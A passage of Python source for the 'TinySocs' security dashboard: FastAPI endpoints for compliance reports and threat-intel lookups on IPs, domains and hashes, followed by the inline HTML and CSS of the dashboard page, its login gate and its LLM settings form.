            f'out of {report["summary"]["total"]} controls</p>'
            f'<table><thead><tr><th>Control</th><th>Name</th><th>Status</th>'
            f'<th>Rules</th><th>Events</th></tr></thead><tbody>{rows}</tbody></table>'
            f'<p style="margin-top:30px;color:#7f8c8d;font-size:12px">'
            f'Generated by TinySocs (demo mode)</p></body></html>'
        )
        return Response(
            content=html, media_type="text/html",
            headers={"Content-Disposition": f'attachment; filename="compliance_{fw_label}.html"'},
        )
    try:
        from tinysocs.reporting.compliance_report import generate_compliance_report, render_html
        loop = asyncio.get_event_loop()
        report = await loop.run_in_executor(
            _os_executor, generate_compliance_report, framework, hours
        )
        html = render_html(report)
        fw_name = report["framework"]["name"].replace(" ", "_")
        return Response(
            content=html,
            media_type="text/html",
            headers={"Content-Disposition": f'attachment; filename="compliance_{fw_name}.html"'},
        )
    except FileNotFoundError as exc:
        return JSONResponse(status_code=404, content={"ok": False, "error": str(exc)})
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


# ---------------------------------------------------------------------------
# Threat Intelligence API (Phase 15 M0)
# ---------------------------------------------------------------------------

@dashboard_app.get("/api/threat-intel/status")
async def api_threat_intel_status():
    """Return status of configured threat intel providers and cache stats."""
    if _DEMO_MODE:
        return _demo_threat_intel_status()
    try:
        from tinysocs.agent.threat_intel import get_providers
        from tinysocs.agent.threat_cache import ThreatCache
        providers = []
        for p in get_providers():
            providers.append({
                "name": p.name,
                "configured": p.is_configured(),
                "available": p.is_available(),
                "quota_remaining": p.quota_remaining(),
            })
        try:
            cache = ThreatCache()
            cache_stats = cache.stats()
        except Exception:
            cache_stats = {"total_entries": 0, "error": "cache unavailable"}
        return {"ok": True, "providers": providers, "cache": cache_stats}
    except Exception as exc:
        return {"ok": False, "providers": [], "cache": {}, "error": str(exc)}


@dashboard_app.get("/api/threat-intel/enrich")
async def api_threat_intel_enrich(
    ip: str = Query(None),
    domain: str = Query(None),
    file_hash: str = Query(None),
):
    """Enrich a single IOC (IP, domain, or hash) on demand."""
    try:
        from tinysocs.agent.threat_intel import enrich_ioc, get_available_providers
        from tinysocs.agent.threat_cache import ThreatCache
        providers = get_available_providers()
        if not providers:
            return {"ok": False, "error": "No threat intel providers configured"}
        cache = ThreatCache()
        results = {}
        if ip:
            r = await enrich_ioc("ip", ip, providers, cache)
            results[ip] = r.to_dict()
        if domain:
            r = await enrich_ioc("domain", domain, providers, cache)
            results[domain] = r.to_dict()
        if file_hash:
            r = await enrich_ioc("hash", file_hash, providers, cache)
            results[file_hash] = r.to_dict()
        return {"ok": True, "enrichment": results}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


@dashboard_app.post("/api/threat-intel/test")
async def api_threat_intel_test():
    """Test configured providers by querying a known-benign IP (8.8.8.8)."""
    try:
        from tinysocs.agent.threat_intel import get_providers
        results = {}
        for p in get_providers():
            if not p.is_configured():
                results[p.name] = {"status": "not_configured"}
                continue
            try:
                health = await p.health_check()
                results[p.name] = {
                    "status": "ok" if health.get("available") else "unavailable",
                    "quota_remaining": health.get("quota_remaining", 0),
                }
            except Exception as e:
                results[p.name] = {"status": "error", "error": str(e)}
        return {"ok": True, "results": results}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


# ---------------------------------------------------------------------------
# HTML dashboard (single page, inline everything)
# ---------------------------------------------------------------------------
@dashboard_app.get("/", response_class=HTMLResponse)
def dashboard_page():
    return _DASHBOARD_HTML


_DASHBOARD_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>TinySocs Dashboard</title>
<style>
:root {
  --bg: #0f1117; --surface: #1a1d27; --border: #2a2d3a;
  --text: #e0e0e0; --muted: #888; --accent: #4a90d9;
  --red: #e74c3c; --orange: #e67e22; --yellow: #f1c40f;
  --green: #27ae60; --blue: #3498db; --gray: #555;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
       background: var(--bg); color: var(--text); font-size: 14px; }
a { color: var(--accent); text-decoration: none; }

.header { background: var(--surface); border-bottom: 1px solid var(--border);
           padding: 16px 24px; display: flex; align-items: center; justify-content: space-between;
           position: sticky; top: 0; z-index: 20; }
.header h1 { font-size: 18px; font-weight: 600; }
.header .meta { color: var(--muted); font-size: 12px; }

.main-layout { display: flex; gap: 16px; padding: 16px 24px; align-items: flex-start; }
.left-panels { flex: 1; min-width: 0; margin-right: 400px; transition: margin-right 0.25s ease; }
.left-panels.expanded { margin-right: 52px; }
.tab-bar { display:flex; gap:0; padding:0 24px; background:var(--surface); border-bottom:1px solid var(--border);
           position:sticky; top:56px; z-index:19; overflow-x:auto; }
.tab-bar button { background:none; border:none; color:var(--muted); padding:10px 18px; font-size:13px;
                  cursor:pointer; border-bottom:2px solid transparent; transition:color 0.15s, border-color 0.15s;
                  white-space:nowrap; font-family:inherit; }
.tab-bar button.active { color:var(--accent); border-bottom-color:var(--accent); }
.tab-bar button:hover:not(.active) { color:var(--text); }
/* Demo mode banner */
.demo-banner { background:#f59e0b; color:#1a1a2e; text-align:center; padding:6px 16px; font-size:12px;
               font-weight:600; position:relative; z-index:18; display:flex; align-items:center;
               justify-content:center; gap:8px; margin-right:416px; }
.demo-banner .close-btn { background:none; border:none; color:#1a1a2e; cursor:pointer; font-size:16px;
                          padding:0 4px; margin-left:8px; opacity:0.7; }
.demo-banner .close-btn:hover { opacity:1; }
/* Sites grid (Phase 17 M1) */
.sites-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(280px, 1fr)); gap:1rem; padding:0.5rem 0; }
.site-card { background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:1rem;
             transition:border-color 0.15s; }
.site-card:hover { border-color:var(--accent); }
.site-card-header { display:flex; align-items:center; gap:8px; margin-bottom:10px; }
.site-card-header strong { margin:0; font-size:14px; color:var(--text); font-weight:600; }
.site-remove-btn { background:none; border:none; color:var(--muted); cursor:pointer; font-size:18px;
                   line-height:1; padding:2px 6px; border-radius:4px; opacity:0; transition:opacity 0.15s; }
.site-card:hover .site-remove-btn { opacity:0.6; }
.site-remove-btn:hover { opacity:1 !important; color:var(--red, #ef4444); background:rgba(239,68,68,0.1); }
.site-metrics { display:flex; flex-direction:column; }
.site-status { width:8px; height:8px; border-radius:50%; display:inline-block; flex-shrink:0; }
.site-status.healthy { background:#22c55e; }
.site-status.warning { background:#f59e0b; }
.site-status.unreachable { background:#ef4444; }
.site-status.cert_mismatch { background:#ef4444; animation: pulse-red 1s infinite; }
@keyframes pulse-red { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
.cert-badge { font-size:10px; padding:1px 6px; border-radius:3px; margin-left:6px; font-weight:600; }
.cert-badge.pinned { background:#166534; color:#86efac; }
.cert-badge.mismatch { background:#991b1b; color:#fca5a5; }
.cert-badge.unpinned { background:#78350f; color:#fcd34d; }
.cert-badge.local { background:#374151; color:#9ca3af; }
.site-metric { display:flex; justify-content:space-between; font-size:12px; padding:3px 0;
               color:var(--muted); border-bottom:1px solid var(--border); }
.site-metric:last-child { border-bottom:none; }
.site-metric .val { color:var(--text); font-weight:500; }
.site-badge { display:inline-block; font-size:10px; padding:1px 6px; border-radius:4px; font-weight:600; }
.site-badge.outdated { background:rgba(245,158,11,0.15); color:#f59e0b; }
.site-error { font-size:11px; color:#ef4444; margin-top:6px; }
.site-card.has-critical { border-left:3px solid #e74c3c; }
.site-card { cursor:pointer; }
.site-alert-badge { display:inline-flex; align-items:center; justify-content:center;
                    min-width:22px; height:22px; padding:0 5px; border-radius:11px;
                    font-size:11px; font-weight:700; color:#fff; flex-shrink:0; margin-left:auto; }
.site-alert-badge.crit { background:#e74c3c; }
.site-alert-badge.high { background:#e67e22; }
.site-alert-badge.none { background:#555; }
.site-ops { font-size:11px; color:var(--muted); margin-top:6px; line-height:1.7; }
.site-ops .sev-line span { font-weight:600; }
.site-ops .sev-crit { color:#e74c3c; }
.site-ops .sev-high { color:#e67e22; }
.sites-aggregate { grid-column:1/-1; display:flex; align-items:center; gap:16px; padding:10px 14px; background:var(--surface);
                   border:1px solid var(--border); border-radius:8px; margin-bottom:12px; font-size:13px;
                   cursor:pointer; transition:border-color 0.15s; flex-wrap:wrap; }
.sites-aggregate:hover { border-color:var(--accent); }
.sites-aggregate .agg-val { font-weight:700; color:var(--text); }
.sites-aggregate .agg-crit { color:#e74c3c; font-weight:700; }
.sites-aggregate .agg-sep { color:var(--border); }
#overview-agg-banner { position:sticky; top:95px; z-index:18; margin:0 24px 0 24px; }
/* Site focus banner (Phase 18 M3 — drill-through mode) */
.site-focus-banner { display:none; position:sticky; z-index:18; padding:6px 14px;
                     background:var(--surface); border-bottom:1px solid var(--border);
                     border-left:3px solid var(--accent); font-size:13px;
                     align-items:center; gap:10px; }
.site-focus-banner.visible { display:flex; }
.site-focus-banner .sfb-back { cursor:pointer; color:var(--accent); font-weight:500;
                               text-decoration:none; white-space:nowrap; }
.site-focus-banner .sfb-back:hover { text-decoration:underline; }
.site-focus-banner .sfb-label { color:var(--text); font-weight:600; }
/* Multi-select host picker dropdown */
.host-picker { position:relative; display:inline-block; }
.host-picker-btn, .timeline-controls select {
  font:12px/1 inherit; font-size:12px; margin:0;
  background:var(--bg); color:var(--text);
  border:1px solid var(--border); border-radius:4px; cursor:pointer;
  height:30px; box-sizing:border-box;
  display:inline-flex; align-items:center;
  -webkit-appearance:none; -moz-appearance:none; appearance:none;
  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%23888'/%3E%3C/svg%3E");
  background-repeat:no-repeat; background-position:right 8px center;
  padding:0 26px 0 10px;
}
.host-picker-btn {
  min-width:140px; max-width:220px;
  text-align:left; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
}
.host-picker-btn:hover, .timeline-controls select:hover { border-color:var(--accent); }
.host-picker-menu {
  display:none; position:absolute; top:calc(100% + 4px); right:0; z-index:50;
  background:var(--surface); border:1px solid var(--border); border-radius:6px;
  min-width:200px; max-height:260px; overflow-y:auto; padding:4px 0;
  box-shadow:0 8px 24px rgba(0,0,0,.4);
}
.host-picker-menu.open { display:block; }
.host-picker-item {
  display:flex; align-items:center; gap:8px; padding:6px 12px; cursor:pointer;
  font-size:12px; color:var(--text); transition:background 0.1s;
}
.host-picker-item:hover { background:var(--hover); }
.host-picker-item input[type=checkbox] { accent-color:var(--accent); margin:0; cursor:pointer; }
.host-picker-item label { cursor:pointer; flex:1; user-select:none; }
.host-picker-divider { height:1px; background:var(--border); margin:4px 0; }
.tab-pane { display:none; }
.tab-pane.active { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
#tab-sites.active { grid-template-columns:1fr; }
.right-panel { width: 384px; position: fixed; top: 90px; right: 24px; bottom: 16px; z-index: 10;
               transition: width 0.25s ease; overflow: hidden; }
.right-panel.collapsed { width: 36px; }
.right-panel.collapsed .assistant-card { padding: 8px 6px; }
.right-panel.collapsed .chat-container,
.right-panel.collapsed .assistant-header-inner { display: none; }
.assistant-toggle { position: absolute; top: 8px; left: 8px; width: 22px; height: 22px;
  background: var(--bg); border: 1px solid var(--border); border-radius: 4px; cursor: pointer;
  color: var(--muted); font-size: 14px; line-height: 20px; text-align: center; z-index: 2;
  padding: 0; transition: color 0.15s; }
.assistant-toggle:hover { color: var(--text); }
@media (max-width: 1100px) {
  .main-layout { flex-direction: column; }
  .left-panels { margin-right: 0; }
  .left-panels.expanded { margin-right: 0; }
  .right-panel { width: 100%; position: relative; top: auto; right: auto; bottom: auto; }
  .right-panel.collapsed { width: 100%; }
  .right-panel .assistant-card { max-height: 450px; height: 450px; }
  .assistant-toggle { display: none; }
  .tab-bar { top: 0; }
}
@media (max-width: 700px) { .tab-pane.active { grid-template-columns: 1fr; } }

.card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
        padding: 16px; overflow: hidden; }
.card h2 { font-size: 14px; color: var(--muted); text-transform: uppercase;
           letter-spacing: 0.5px; margin-bottom: 12px; font-weight: 500; }
.card-header-sticky { background: var(--surface); margin: -16px -16px 12px -16px; padding: 12px 16px 8px 16px;
  border-bottom: 1px solid var(--border); }
.card.full { grid-column: 1 / -1; }
.card.assistant-card { height: 100%; max-height: 100%; box-sizing: border-box;
                       display: flex; flex-direction: column; }

.explorer-toolbar { display: flex; gap: 6px; margin-bottom: 6px; align-items: stretch; }
.explorer-toolbar select { width: auto; flex-shrink: 0; margin-bottom: 0;
  padding: 6px 10px; background: var(--bg); color: var(--fg);
  border: 1px solid var(--border); border-radius: 4px; font-size: 13px; }
.explorer-toolbar input[type="text"] { flex: 1; min-width: 0; margin-bottom: 0; }
.explorer-toolbar button { flex-shrink: 0; padding: 6px 14px; margin-bottom: 0;
  background: var(--accent); color: #fff; border: none; border-radius: 4px;
  cursor: pointer; font-size: 13px; white-space: nowrap; }

.stat-row { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 12px; }
.stat { background: var(--bg); border-radius: 6px; padding: 12px 16px; flex: 1; min-width: 100px; }
.stat .value { font-size: 28px; font-weight: 700; }
.stat .label { font-size: 11px; color: var(--muted); margin-top: 2px; }

table { width: 100%; border-collapse: collapse; font-size: 13px; }
th { text-align: left; color: var(--muted); font-weight: 500; padding: 6px 8px;
     border-bottom: 1px solid var(--border); font-size: 11px; text-transform: uppercase; }
td { padding: 6px 8px; border-bottom: 1px solid var(--border); }
tr:hover { background: rgba(74, 144, 217, 0.05); }

.badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px;
         font-weight: 600; text-transform: uppercase; }
.badge-critical { background: rgba(231,76,60,0.15); color: var(--red); }
.badge-high { background: rgba(230,126,34,0.15); color: var(--orange); }
.badge-medium { background: rgba(241,196,15,0.15); color: var(--yellow); }
.badge-low { background: rgba(52,152,219,0.15); color: var(--blue); }
.badge-info { background: rgba(85,85,85,0.15); color: var(--gray); }

.badge-staged { background: rgba(241,196,15,0.15); color: var(--yellow); }
.badge-approved { background: rgba(52,152,219,0.15); color: var(--blue); }
.badge-executing { background: rgba(230,126,34,0.15); color: var(--orange); }
.badge-completed { background: rgba(39,174,96,0.15); color: var(--green); }
.badge-failed { background: rgba(231,76,60,0.15); color: var(--red); }
.badge-rejected { background: rgba(231,76,60,0.15); color: var(--red); }

.btn-sm { padding: 3px 10px; border: none; border-radius: 4px; cursor: pointer;
          font-size: 11px; font-weight: 600; margin-right: 4px; }
.btn-approve { background: var(--green); color: #fff; }
.btn-approve:hover { opacity: 0.85; }
.btn-reject { background: var(--red); color: #fff; }
.btn-reject:hover { opacity: 0.85; }
.btn-sm:disabled { opacity: 0.4; cursor: not-allowed; }

#events-content { overflow: hidden; }
#events-content table { table-layout: fixed; width: 100%; }
#events-content td, #events-content th { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

/* Threat intelligence badges */
.threat-badge { display:inline-flex; align-items:center; gap:3px; font-size:10px; padding:1px 6px; border-radius:3px; cursor:pointer; font-weight:600; }
.threat-badge.threat-high { background:#e74c3c; color:#fff; }
.threat-badge.threat-medium { background:#e67e22; color:#fff; }
.threat-badge.threat-low { background:#f1c40f; color:#222; }
.threat-badge.threat-none { background:#27ae60; color:#fff; }
.threat-popover { position:absolute; z-index:100; background:var(--surface); border:1px solid var(--border); border-radius:6px; padding:12px; font-size:12px; max-width:340px; box-shadow:0 4px 12px rgba(0,0,0,0.4); }
.threat-popover td { padding:2px 8px; }
.threat-popover .provider-label { font-weight:600; color:var(--accent); text-transform:uppercase; font-size:10px; letter-spacing:.5px; }

/* Host Timeline inline widget */
.timeline-card { min-height: 200px; height: auto; overflow: visible; }
.timeline-card h2 { margin-bottom: 0; }

/* Match main-content widget heights to assistant panel (top:90px, bottom:16px) */
#event-explorer-card { height: calc(100vh - 120px); max-height: calc(100vh - 120px); box-sizing: border-box;
  display: flex; flex-direction: column; }
#event-explorer-card .card-header-sticky { flex-shrink: 0; }
#event-explorer-card .card-body { flex: 1; display: flex; flex-direction: column; min-height: 0; overflow: hidden; }
#event-explorer-card .explorer-toolbar { flex-shrink: 0; }
#event-explorer-card .explorer-table-wrap { flex: 1; overflow: hidden; min-height: 0; }
#event-explorer-card .pager { flex-shrink: 0; }
/* Event Explorer: copyable cells, expandable message, sortable headers */
#event-explorer-card td { cursor: pointer; user-select: text; position: relative; }
#event-explorer-card td:hover { background: rgba(74,144,217,0.06); }
#event-explorer-card th.sortable { cursor: pointer; user-select: none; white-space: nowrap; }
#event-explorer-card th.sortable:hover { color: var(--accent); }
#event-explorer-card th .sort-arrow { font-size: 10px; margin-left: 3px; opacity: 0.6; }
#event-explorer-card tr.expanded td.msg-cell { white-space: pre-wrap !important; max-width: none !important;
  text-overflow: clip !important; overflow: visible !important; word-break: break-word; }
.copy-toast { position: fixed; background: #27ae60; color: #fff; padding: 4px 12px;
  border-radius: 4px; font-size: 11px; pointer-events: none; z-index: 9999;
  animation: copyFade 1.2s ease forwards; }
@keyframes copyFade { 0% { opacity: 1; transform: translateY(0); }
  100% { opacity: 0; transform: translateY(-12px); } }
#tab-fleet.active { display: flex !important; flex-direction: column; height: calc(100vh - 120px); max-height: calc(100vh - 120px); }
#tab-fleet > .card:first-child { flex-shrink: 0; }
#tab-fleet .card.full.timeline-card { flex: 1; min-height: 300px; overflow: visible;
  display: flex; flex-direction: column; }
#tab-fleet .card.full.timeline-card > div:first-child { flex-shrink: 0; }
#hostTimelineChart { flex: 1; min-height: 0; }
#hostTimelineChart svg, #hostTimelineChart canvas { width: 100% !important; height: 100% !important; }
#hostTimelineLegend { flex-shrink: 0; }
#tab-detections > .card:first-child { box-sizing: border-box;
  display: flex; flex-direction: column; }
#tab-detections > .card:first-child .card-header-sticky { flex-shrink: 0; }
#tab-detections > .card:first-child > div:not(.card-header-sticky):not(.pager) { flex: 1; min-height: 0; }
#tab-detections > .card:first-child .pager { flex-shrink: 0; margin-top: auto; }

/* Shared pager */
.pager { display: flex; align-items: center; justify-content: center; gap: 8px;
  padding: 8px 0 0 0; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); }
.pager button { font-size: 11px; padding: 2px 10px; background: var(--bg); color: var(--text);
  border: 1px solid var(--border); border-radius: 4px; cursor: pointer; }
.pager button:disabled { opacity: 0.35; cursor: default; }

/* Alert Rules */
.rules-btn { font-size: 11px; padding: 4px 12px; border: none; border-radius: 4px;
  cursor: pointer; font-weight: 500; white-space: nowrap; line-height: 1.4; }
.rules-btn-accent { background: var(--accent); color: #fff; }
.rules-btn-accent:hover { opacity: 0.85; }
.rules-btn-purple { background: #8e44ad; color: #fff; }
.rules-btn-purple:hover { opacity: 0.85; }
.rule-row { padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
.rule-row:last-child { border-bottom: none; }
.rule-row-header { display: flex; align-items: center; gap: 8px; cursor: pointer; }
.rule-row-header:hover { opacity: 0.85; }
.rule-row .rule-id { font-family: monospace; font-size: 12px; color: var(--accent);
  width: 260px; flex-shrink: 0; flex-grow: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.rule-row .rule-desc { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.rule-row .rule-meta { color: var(--muted); font-size: 11px; white-space: nowrap; }
.rule-detail { display: none; padding: 8px 0 4px 0; font-size: 12px; }
.rule-detail.open { display: block; }
.rule-detail pre { background: var(--bg); padding: 8px; border-radius: 4px; font-size: 11px;
  overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 4px 0; }

/* Fired Detections panel — match assistant panel height (top:90px + gap) */
.detections-card { max-height: calc(100vh - 120px); overflow: hidden; box-sizing: border-box;
  display: flex; flex-direction: column; }
.detections-card .card-header-sticky { flex-shrink: 0; }
.detections-card .card-body { flex: 1; display: flex; flex-direction: column; min-height: 0; overflow: hidden; }
.detections-card .card-body > div:first-child { flex: 1; overflow-y: auto; min-height: 0; }
.detections-card .pager { flex-shrink: 0; }
.detection-row { padding: 8px 0; border-bottom: 1px solid var(--border); cursor: pointer;
                 transition: background 0.15s; }
.detection-row:hover { background: rgba(74, 144, 217, 0.05); }
.detection-row-header { display: flex; align-items: center; gap: 10px; font-size: 13px; }
.detection-row-header .rule-name { font-weight: 500; flex: 1; min-width: 0;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.detection-row-header .det-meta { color: var(--muted); font-size: 12px; white-space: nowrap; }
.detection-detail { display: none; padding: 12px 16px; margin-top: 6px;
  background: var(--bg); border-radius: 6px; font-size: 12px; }
.detection-detail.open { display: block; }
.detection-detail table { margin-bottom: 10px; }
.detection-detail td { padding: 3px 8px; }
.detection-detail td:first-child { color: var(--muted); font-weight: 500; white-space: nowrap; width: 120px; }
.btn-summarize { background: var(--accent); color: #fff; border: none; padding: 5px 14px;
  border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: 500; }
.btn-summarize:hover { opacity: 0.9; }
.btn-summarize:disabled { opacity: 0.4; cursor: wait; }
.ai-summary { margin-top: 8px; padding: 10px 12px; background: rgba(74, 144, 217, 0.08);
  border-left: 3px solid var(--accent); border-radius: 4px; font-size: 12px;
  white-space: pre-wrap; word-wrap: break-word; line-height: 1.5; }

.chat-container { display: flex; flex-direction: column; flex: 1; min-height: 0; }
.chat-messages { flex: 1; min-height: 0; max-height: calc(100vh - 240px); overflow-y: auto; padding: 8px;
                 background: var(--bg); border: 1px solid var(--border); border-radius: 4px;
                 margin-bottom: 8px; font-size: 13px; }
.chat-msg { margin-bottom: 8px; padding: 6px 10px; border-radius: 6px; max-width: 85%;
            white-space: pre-wrap; word-wrap: break-word; }
.chat-msg.user { background: rgba(74,144,217,0.15); margin-left: auto; text-align: right; }
.chat-msg.assistant { background: rgba(255,255,255,0.05); }
.chat-msg.tool-info { background: rgba(241,196,15,0.1); font-size: 11px; color: var(--muted);
                      font-family: monospace; max-width: 100%; }
.chat-input-row { display: flex; gap: 8px; flex-shrink: 0; padding-top: 8px; }
.chat-input-row input { flex: 1; }
.chat-input-row button { white-space: nowrap; }

.chart-svg { width: 100%; height: 200px; }
.chart-svg text { fill: var(--muted); font-size: 10px; font-family: inherit; }
.chart-svg .grid-line { stroke: var(--border); stroke-width: 1; }
.chart-svg .bar-rect { cursor: pointer; rx: 2; ry: 2; }
.chart-svg .bar-rect:hover { opacity: 0.8; }
.chart-tooltip { position: absolute; background: var(--surface); border: 1px solid var(--border);
  padding: 6px 10px; border-radius: 6px; font-size: 11px; white-space: nowrap; z-index: 20;
  pointer-events: none; display: none; color: var(--text); }
.chart-legend { display: flex; gap: 12px; justify-content: center; margin-top: 6px; font-size: 11px; color: var(--muted); }
.chart-legend span::before { content: ''; display: inline-block; width: 10px; height: 10px;
  border-radius: 2px; margin-right: 4px; vertical-align: middle; }

.empty { text-align: center; padding: 40px; color: var(--muted); }
.error { color: var(--muted); font-size: 12px; padding: 8px; background: rgba(255,255,255,0.03);
         border: 1px solid var(--border); border-radius: 4px; margin-bottom: 8px; }
.loading { color: var(--muted); text-align: center; padding: 20px; }
.refresh-btn { background: var(--accent); color: #fff; border: none; padding: 6px 14px;
               border-radius: 4px; cursor: pointer; font-size: 12px; }
.refresh-btn:hover { opacity: 0.9; }
.tabs { display: flex; gap: 4px; margin-bottom: 12px; }
.tab { padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;
       color: var(--muted); background: var(--bg); border: 1px solid var(--border); }
.tab.active { background: var(--accent); color: #fff; border-color: var(--accent); }
input[type="text"], input[type="password"], input[type="number"], select, textarea {
  background: var(--bg); border: 1px solid var(--border); color: var(--text);
  padding: 6px 10px; border-radius: 4px; font-size: 13px; width: 100%; margin-bottom: 8px; }
select { cursor: pointer; }

/* Settings modal */
.modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.6); z-index: 100; align-items: center; justify-content: center; }
.modal-overlay.open { display: flex; }
.modal { background: var(--surface); border: 1px solid var(--border); border-radius: 10px;
  width: 600px; max-width: 95vw; max-height: 85vh; overflow-y: auto; padding: 24px; }
.modal h2 { font-size: 16px; margin-bottom: 16px; color: var(--text); text-transform: none;
  letter-spacing: 0; font-weight: 600; }
.modal .section-title { font-size: 12px; color: var(--accent); text-transform: uppercase;
  letter-spacing: 0.5px; margin: 16px 0 8px; padding-bottom: 4px;
  border-bottom: 1px solid var(--border); }
.modal label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 4px; }
.modal .field { margin-bottom: 10px; }
.modal .btn-row { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }
.modal .btn-save { background: var(--accent); color: #fff; border: none; padding: 8px 20px;
  border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: 600; }
.modal .btn-save:hover { opacity: 0.9; }
.modal .btn-cancel { background: var(--bg); color: var(--muted); border: 1px solid var(--border);
  padding: 8px 20px; border-radius: 4px; cursor: pointer; font-size: 13px; }
.modal .btn-cancel:hover { color: var(--text); }
.modal .status-msg { font-size: 12px; padding: 6px 10px; border-radius: 4px; margin-top: 8px; }
.modal .status-msg.ok { background: rgba(39,174,96,0.15); color: var(--green); }
.modal .status-msg.err { background: rgba(231,76,60,0.15); color: var(--red); }

.settings-btn { background: none; border: none; color: var(--muted); cursor: pointer;
  font-size: 18px; padding: 4px 8px; margin-left: 8px; transition: color 0.2s; }
.settings-btn:hover { color: var(--text); }

.login-box { text-align: center; padding: 24px; }
.login-box input { max-width: 280px; margin: 8px auto; display: block; }
.login-box .btn-save { margin-top: 8px; }
</style>
</head>
<body>

<!-- Full-page login gate (M0) -->
<div id="loginGate" style="position:fixed;inset:0;z-index:10000;background:var(--bg);display:flex;align-items:center;justify-content:center">
  <div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:40px 36px;max-width:360px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,0.3)">
    <h1 style="font-size:22px;margin-bottom:6px">TinySocs Dashboard</h1>
    <div style="color:var(--muted);font-size:13px;margin-bottom:24px">Enter your admin password to continue</div>
    <input type="password" id="loginPassword" placeholder="Password" style="width:100%;max-width:280px;margin:0 auto 12px auto;display:block" onkeydown="if(event.key==='Enter')doLogin()">
    <button onclick="doLogin()" style="background:var(--accent);color:#fff;border:none;border-radius:6px;padding:10px 32px;font-size:14px;cursor:pointer;font-weight:500">Sign In</button>
    <div id="loginError" style="color:var(--red);font-size:13px;margin-top:8px;min-height:20px"></div>
  </div>
</div>

<div id="dashboardContent" style="visibility:hidden">
<div class="header">
  <div>
    <h1>TinySocs Dashboard</h1>
    <div class="meta" id="lastUpdate">Loading...</div>
  </div>
  <div>
    <div class="tabs" style="display:inline-flex; margin-right: 8px;">
      <div class="tab active" onclick="setHours(24)">24h</div>
      <div class="tab" onclick="setHours(48)">48h</div>
      <div class="tab" onclick="setHours(168)">7d</div>
    </div>
    <button class="refresh-btn" onclick="refreshAll()">Refresh</button>
    <button class="settings-btn" onclick="openSettings()" title="Settings">&#9881;</button>
    <button class="settings-btn" onclick="doLogout()" title="Logout" style="margin-left:4px">&#x23FB;</button>
  </div>
</div>

<!-- Version Drift Banner (Phase 15 M5) -->
<div id="versionDriftBanner" style="display:none;background:#e67e22;color:#fff;padding:8px 24px;font-size:13px;font-weight:500;text-align:center;cursor:pointer" onclick="ensureCardVisible('fleet');document.getElementById('body-fleet').scrollIntoView({behavior:'smooth'})">
  <span id="versionDriftText"></span>
</div>

<!-- Settings Modal -->
<div class="modal-overlay" id="settingsOverlay" onclick="if(event.target===this)closeSettings()">
  <div class="modal" id="settingsModal">
    <!-- Login view -->
    <div id="settingsLogin">
      <h2>&#9881; Settings</h2>
      <div class="login-box">
        <p style="color:var(--muted);font-size:13px;margin-bottom:12px">Enter admin password to access settings</p>
        <input type="password" id="adminPassword" placeholder="Admin password" onkeydown="if(event.key==='Enter')settingsAuth()">
        <button class="btn-save" onclick="settingsAuth()">Unlock</button>
        <div id="settingsLoginError"></div>
      </div>
    </div>
    <!-- First-time password setup view -->
    <div id="settingsSetup" style="display:none">
      <h2>&#128274; Set Dashboard Password</h2>
      <div class="login-box">
        <p style="color:var(--muted);font-size:13px;margin-bottom:12px">
          No password has been configured yet. Set one now to protect your dashboard and SIEM access.
        </p>
        <input type="password" id="setupPassword" placeholder="New password (min 8 characters)" onkeydown="if(event.key==='Enter')document.getElementById('setupPasswordConfirm').focus()">
        <input type="password" id="setupPasswordConfirm" placeholder="Confirm password" style="margin-top:4px" onkeydown="if(event.key==='Enter')submitSetupPassword()">
        <button class="btn-save" onclick="submitSetupPassword()">Set Password</button>
        <div id="setupError"></div>
      </div>
    </div>
    <!-- Settings form (hidden until auth) -->
    <div id="settingsForm" style="display:none">
      <h2>&#9881; Settings</h2>
      <div id="settingsStatus"></div>

      <div class="section-title">LLM Configuration</div>
      <p style="color:var(--muted);font-size:11px;margin-bottom:8px">&#x2139;&#xFE0F; OpenAI and Anthropic modes send query results to external APIs. For maximum privacy, use Ollama (runs entirely on this machine).</p>
      <div class="field">
        <label>LLM Provider</label>
        <select id="s_LLM_MODE">
          <option value="openai">OpenAI</option>
          <option value="anthropic">Anthropic (Claude)</option>
          <option value="ollama">Ollama (Offline)</option>
          <option value="offline">Disabled</option>
        </select>
      </div>
      <div class="field" id="field_openai">
        <label>OpenAI API Key</label>
        <input type="text" id="s_OPENAI_API_KEY" placeholder="sk-...">
        <label>OpenAI Model</label>
        <input type="text" id="s_OPENAI_MODEL" placeholder="e.g. gpt-4o, gpt-4o-mini, o1-mini">
      </div>
      <div class="field" id="field_anthropic">
        <label>Anthropic API Key</label>
        <input type="text" id="s_ANTHROPIC_API_KEY" placeholder="sk-ant-...">
